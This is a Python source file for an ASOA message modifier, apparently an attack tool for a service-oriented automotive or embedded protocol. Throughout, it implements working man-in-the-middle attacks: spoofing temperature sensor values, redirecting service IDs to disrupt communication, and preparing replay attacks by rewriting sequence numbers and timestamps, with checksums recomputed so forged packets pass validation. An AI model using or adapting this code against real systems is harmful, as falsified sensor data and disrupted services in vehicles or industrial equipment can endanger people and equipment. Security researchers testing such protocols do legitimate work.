#!/usr/bin/env python3
"""
ASOA Message Modifier - Advanced ASOA Message Manipulation
Handles ASOA-specific message modification while maintaining protocol integrity
"""

import struct
import logging
import time
from typing import Dict, List, Optional, Tuple, Any, Callable
from dataclasses import dataclass
import socket

from asoa_protocol_analyzer import ASOAProtocolAnalyzer, ASOAMessageType, ASOAPacketHeader
from ucdr_handler import UCDRHandler

@dataclass
class ModifiedMessage:
    """Represents a modified ASOA message"""
    original_packet: bytes
    modified_packet: bytes
    modification_type: str
    original_value: Any
    new_value: Any
    timestamp: float
    success: bool

class ASOAMessageModifier:
    """
    Advanced ASOA Message Modifier
    Handles ASOA-specific message modification and forwarding
    """
    
    def __init__(self, logger=None):
        self.logger = logger or logging.getLogger(__name__)
        self.protocol_analyzer = ASOAProtocolAnalyzer(logger)
        self.ucdr_handler = UCDRHandler(logger)
        self.modification_stats = {
            'total_packets': 0,
            'modified_packets': 0,
            'temperature_modifications': 0,
            'failed_modifications': 0,
            'last_modification': None
        }
        self.modification_callbacks = []
        
    def register_modification_callback(self, callback: Callable[[ModifiedMessage], None]):
        """
        Register callback for modification events
        """
        self.modification_callbacks.append(callback)
        
    def modify_asoa_packet(self, packet: bytes, attack_type: str, **kwargs) -> Optional[bytes]:
        """
        Modify ASOA packet based on attack type
        """
        try:
            self.modification_stats['total_packets'] += 1
            
            # Analyze the packet
            analysis = self.protocol_analyzer.analyze_packet(packet)
            if not analysis:
                self.logger.warning("Failed to analyze ASOA packet")
                return None
            
            # Apply modification based on attack type
            modified_packet = None
            original_value = None
            new_value = None
            
            if attack_type == 'temperature-spoof':
                modified_packet, original_value, new_value = self._modify_temperature(
                    packet, analysis, kwargs.get('target_temperature', 99.9)
                )
            elif attack_type == 'service-disrupt':
                modified_packet, original_value, new_value = self._disrupt_service(
                    packet, analysis, kwargs.get('target_service')
                )
            elif attack_type == 'message-replay':
                modified_packet, original_value, new_value = self._prepare_replay(
                    packet, analysis, kwargs.get('replay_count', 1)
                )
            else:
                self.logger.error(f"Unknown attack type: {attack_type}")
                return None
            
            if modified_packet:
                self.modification_stats['modified_packets'] += 1
                if attack_type == 'temperature-spoof':
                    self.modification_stats['temperature_modifications'] += 1
                
                # Create modification record
                modification = ModifiedMessage(
                    original_packet=packet,
                    modified_packet=modified_packet,
                    modification_type=attack_type,
                    original_value=original_value,
                    new_value=new_value,
                    timestamp=time.time(),
                    success=True
                )
                
                self.modification_stats['last_modification'] = modification
                
                # Notify callbacks
                for callback in self.modification_callbacks:
                    try:
                        callback(modification)
                    except Exception as e:
                        self.logger.error(f"Callback error: {e}")
                
                self.logger.info(f"Successfully modified ASOA packet: {attack_type}")
                return modified_packet
            else:
                self.modification_stats['failed_modifications'] += 1
                self.logger.warning(f"Failed to modify ASOA packet: {attack_type}")
                return None
                
        except Exception as e:
            self.logger.error(f"Error modifying ASOA packet: {e}")
            self.modification_stats['failed_modifications'] += 1
            return None
    
    def _modify_temperature(self, packet: bytes, analysis: Dict[str, Any], target_temp: float) -> Tuple[Optional[bytes], Any, Any]:
        """
        Modify temperature data in ASOA packet
        """
        try:
            original_temp = None
            modified_packet = None
            
            # Check if packet contains temperature data
            if analysis.get('contains_temperature') and 'temperature_data' in analysis:
                temp_data = analysis['temperature_data']
                original_temp = temp_data.temperature_value
                
                # Modify the temperature in the payload
                header = analysis['header']
                payload = analysis['payload']
                
                # Modify temperature in ucdr payload
                modified_payload = self.ucdr_handler.modify_temperature_in_ucdr(payload, target_temp)
                
                if modified_payload:
                    # Reconstruct packet with modified payload
                    modified_packet = self._reconstruct_packet(header, modified_payload)
                    
                    self.logger.info(f"Temperature modified: {original_temp}°C -> {target_temp}°C")
                    return modified_packet, original_temp, target_temp
            
            # Fallback: try to find temperature in raw packet
            original_temp = self.ucdr_handler.extract_temperature_from_ucdr(packet[32:])
            if original_temp is not None:
                modified_packet = self.ucdr_handler.modify_temperature_in_ucdr(packet, target_temp)
                if modified_packet:
                    self.logger.info(f"Temperature modified (raw): {original_temp}°C -> {target_temp}°C")
                    return modified_packet, original_temp, target_temp
            
            return None, None, None
            
        except Exception as e:
            self.logger.error(f"Error modifying temperature: {e}")
            return None, None, None
    
    def _disrupt_service(self, packet: bytes, analysis: Dict[str, Any], target_service: str) -> Tuple[Optional[bytes], Any, Any]:
        """
        Disrupt ASOA service communication
        """
        try:
            # Modify service ID to redirect traffic
            header = analysis['header']
            original_service_id = header.target_service_id
            
            # Find target service ID
            service_mapping = self.protocol_analyzer.get_service_mapping()
            target_service_id = None
            for sid, name in service_mapping.items():
                if name == target_service:
                    target_service_id = sid
                    break
            
            if target_service_id is None:
                self.logger.warning(f"Target service not found: {target_service}")
                return None, None, None
            
            # Create modified header with new target service
            modified_header = ASOAPacketHeader(
                magic=header.magic,
                version=header.version,
                message_type=header.message_type,
                service_id=header.service_id,
                target_service_id=target_service_id,
                sequence_number=header.sequence_number,
                payload_length=header.payload_length,
                checksum=0,  # Will be recalculated
                timestamp=header.timestamp
            )
            
            # Recalculate checksum
            modified_header.checksum = self._calculate_packet_checksum(modified_header, analysis['payload'])
            
            # Reconstruct packet
            modified_packet = self._reconstruct_packet(modified_header, analysis['payload'])
            
            self.logger.info(f"Service disruption: {original_service_id} -> {target_service_id}")
            return modified_packet, original_service_id, target_service_id
            
        except Exception as e:
            self.logger.error(f"Error disrupting service: {e}")
            return None, None, None
    
    def _prepare_replay(self, packet: bytes, analysis: Dict[str, Any], replay_count: int) -> Tuple[Optional[bytes], Any, Any]:
        """
        Prepare packet for replay attack
        """
        try:
            # Modify sequence number to avoid conflicts
            header = analysis['header']
            original_seq = header.sequence_number
            
            # Create modified header with incremented sequence
            modified_header = ASOAPacketHeader(
                magic=header.magic,
                version=header.version,
                message_type=header.message_type,
                service_id=header.service_id,
                target_service_id=header.target_service_id,
                sequence_number=original_seq + replay_count,
                payload_length=header.payload_length,
                checksum=0,  # Will be recalculated
                timestamp=int(time.time() * 1000000)  # Update timestamp
            )
            
            # Recalculate checksum
            modified_header.checksum = self._calculate_packet_checksum(modified_header, analysis['payload'])
            
            # Reconstruct packet
            modified_packet = self._reconstruct_packet(modified_header, analysis['payload'])
            
            self.logger.info(f"Replay preparation: seq {original_seq} -> {modified_header.sequence_number}")
            return modified_packet, original_seq, modified_header.sequence_number
            
        except Exception as e:
            self.logger.error(f"Error preparing replay: {e}")
            return None, None, None
    
    def _reconstruct_packet(self, header: ASOAPacketHeader, payload: bytes) -> bytes:
        """
        Reconstruct ASOA packet from header and payload
        """
        try:
            # Create packet buffer
            packet_size = 32 + len(payload)  # Header + payload
            packet = bytearray(packet_size)
            
            # Write header
            offset = 0
            packet[offset:offset+4] = header.magic
            offset += 4
            packet[offset] = header.version
            offset += 1
            packet[offset] = header.message_type.value
            offset += 1
            struct.pack_into('<H', packet, offset, header.service_id)
            offset += 2
            struct.pack_into('<H', packet, offset, header.target_service_id)
            offset += 2
            struct.pack_into('<I', packet, offset, header.sequence_number)
            offset += 4
            struct.pack_into('<I', packet, offset, header.payload_length)
            offset += 4
            struct.pack_into('<I', packet, offset, header.checksum)
            offset += 4
            struct.pack_into('<Q', packet, offset, header.timestamp)
            offset += 8
            
            # Write payload
            packet[32:32+len(payload)] = payload
            
            return bytes(packet)
            
        except Exception as e:
            self.logger.error(f"Error reconstructing packet: {e}")
            return b''
    
    def _calculate_packet_checksum(self, header: ASOAPacketHeader, payload: bytes) -> int:
        """
        Calculate ASOA packet checksum
        """
        try:
            # Create data for checksum calculation (header without checksum + payload)
            header_data = bytearray(32)
            offset = 0
            
            header_data[offset:offset+4] = header.magic
            offset += 4
            header_data[offset] = header.version
            offset += 1
            header_data[offset] = header.message_type.value
            offset += 1
            struct.pack_into('<H', header_data, offset, header.service_id)
            offset += 2
            struct.pack_into('<H', header_data, offset, header.target_service_id)
            offset += 2
            struct.pack_into('<I', header_data, offset, header.sequence_number)
            offset += 4
            struct.pack_into('<I', header_data, offset, header.payload_length)
            offset += 4
            # Skip checksum field (4 bytes)
            offset += 4
            struct.pack_into('<Q', header_data, offset, header.timestamp)
            offset += 8
            
            # Combine header and payload for checksum
            checksum_data = bytes(header_data) + payload
            
            return self.protocol_analyzer._calculate_checksum(checksum_data)
            
        except Exception as e:
            self.logger.error(f"Error calculating checksum: {e}")
            return 0
    
    def validate_modified_packet(self, packet: bytes) -> bool:
        """
        Validate modified ASOA packet integrity
        """
        try:
            # Check basic packet structure
            if len(packet) < 32:
                return False
            
            # Validate checksum
            if not self.protocol_analyzer.validate_checksum(packet):
                self.logger.warning("Modified packet checksum validation failed")
                return False
            
            # Analyze packet
            analysis = self.protocol_analyzer.analyze_packet(packet)
            if not analysis:
                return False
            
            # Additional validation for temperature data
            if analysis.get('contains_temperature'):
                payload = analysis['payload']
                if not self.ucdr_handler.validate_ucdr_integrity(payload, {
                    'topic_id': 'uint32',
                    'temperature_value': 'float32'
                }):
                    self.logger.warning("Temperature data validation failed")
                    return False
            
            return True
            
        except Exception as e:
            self.logger.error(f"Error validating modified packet: {e}")
            return False
    
    def get_modification_stats(self) -> Dict[str, Any]:
        """
        Get modification statistics
        """
        stats = self.modification_stats.copy()
        if stats['last_modification']:
            stats['last_modification'] = {
                'type': stats['last_modification'].modification_type,
                'timestamp': stats['last_modification'].timestamp,
                'original_value': stats['last_modification'].original_value,
                'new_value': stats['last_modification'].new_value
            }
        return stats
    
    def reset_stats(self):
        """
        Reset modification statistics
        """
        self.modification_stats = {
            'total_packets': 0,
            'modified_packets': 0,
            'temperature_modifications': 0,
            'failed_modifications': 0,
            'last_modification': None
        }
